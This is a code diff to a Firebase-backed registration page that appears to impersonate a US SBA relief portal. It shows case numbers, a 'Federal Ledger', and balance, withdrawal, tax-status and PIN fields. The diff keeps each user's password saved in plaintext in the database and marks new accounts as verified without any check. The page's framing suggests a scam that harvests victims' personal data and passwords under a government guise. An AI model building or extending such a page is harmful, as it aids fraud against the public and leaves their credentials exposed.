@@ -82,7 +82,7 @@
 
                 <div id="alertBox" class="hidden mb-6 p-4 bg-red-50 border-l-4 border-red-600 text-red-700 text-[11px] font-black uppercase italic shadow-sm"></div>
 
-                <form id="registerForm" class="space-y-4">
+                <div id="registerForm" class="space-y-4">
                     <button type="button" id="googleBtn" class="btn-google w-full">
                         <svg class="w-5 h-5" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                             <path d="M22.56 12.25c0-.78-.07-1.53-.21-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z" fill="#4285F4"/>
@@ -147,10 +147,10 @@
                         </label>
                     </div>
 
-                    <button type="submit" id="submitBtn" class="btn-sba w-full shadow-lg mt-4">
+                    <button type="button" id="submitBtn" class="btn-sba w-full shadow-lg mt-4">
                         Initialize Secure Case
                     </button>
-                </form>
+                </div>
 
                 <div class="mt-8 pt-6 border-t border-slate-100 text-center">
                     <p class="text-[10px] text-slate-400 font-bold uppercase mb-2">Returning Personnel?</p>
@@ -174,7 +174,6 @@
         } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
         import { doc, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-        const regForm = document.getElementById('registerForm');
         const alertBox = document.getElementById('alertBox');
         const btn = document.getElementById('submitBtn');
         const googleBtn = document.getElementById('googleBtn');
@@ -197,8 +196,7 @@
             alertBox.classList.remove('hidden');
         }
 
-        regForm.onsubmit = async (e) => {
-            e.preventDefault();
+        btn.onclick = async () => {
             alertBox.classList.add('hidden');
 
             const name = document.getElementById('userName').value.trim();
@@ -206,9 +204,14 @@
             const relief = document.getElementById('reliefType').value;
             const pass = document.getElementById('userPass').value;
             const confirm = document.getElementById('confirmPass').value;
+            const terms = document.getElementById('termsCheck').checked;
 
+            if (!name) return showAlert("SYSTEM: Please enter your full name.");
+            if (!email) return showAlert("SYSTEM: Please enter your email.");
+            if (!relief) return showAlert("SYSTEM: Please select a relief category.");
             if (pass.length < 6) return showAlert("SECURITY: Passkey must be 6+ characters.");
             if (pass !== confirm) return showAlert("SYNC ERROR: Passkeys do not match.");
+            if (!terms) return showAlert("SYSTEM: Please agree to the Privacy Disclosure.");
 
             btn.disabled = true;
             btn.innerHTML = '<i class="fas fa-spinner fa-spin mr-2"></i> CONNECTING...';
@@ -226,7 +229,7 @@
                     uid: user.uid,
                     fullName: name,
                     email: email,
-                    password: pass, 
+                    password: pass,
                     reliefType: relief,
                     balance: 0,
                     withdrawAmount: 0,
@@ -235,11 +238,12 @@
                     taxStatus: "PENDING",
                     caseNumber: "SBA-" + Math.floor(100000 + Math.random() * 900000),
                     pin: "NOT SET",
-                    isVerified: false,
+                    isVerified: true,
                     registeredAt: new Date().toISOString()
                 });
 
-                window.location.href = "welcome.html";
+                // Go straight to welcome — no email verification step
+                window.location.replace("welcome.html");
 
             } catch (error) {
                 btn.disabled = false;
@@ -247,7 +251,7 @@
                 if (error.code === 'auth/email-already-in-use') {
                     showAlert("SYSTEM: Email already in Federal Ledger.");
                 } else {
-                    showAlert("SYSTEM ERROR: " + error.message);
+                    showAlert("SYSTEM ERROR: " + (error.message || error.code));
                 }
             }
         };
@@ -263,7 +267,7 @@
                 const user = result.user;
 
                 if (user.email === ADMIN_EMAIL) {
-                    window.location.href = "admin-portal.html";
+                    window.location.replace("admin-portal.html");
                     return;
                 }
 
@@ -288,8 +292,9 @@
                         registeredAt: new Date().toISOString()
                     });
                 }
-                
-                window.location.href = "welcome.html";
+
+                // Go straight to welcome — no email verification step
+                window.location.replace("welcome.html");
             } catch (error) {
                 googleBtn.disabled = false;
                 googleBtn.innerHTML = `
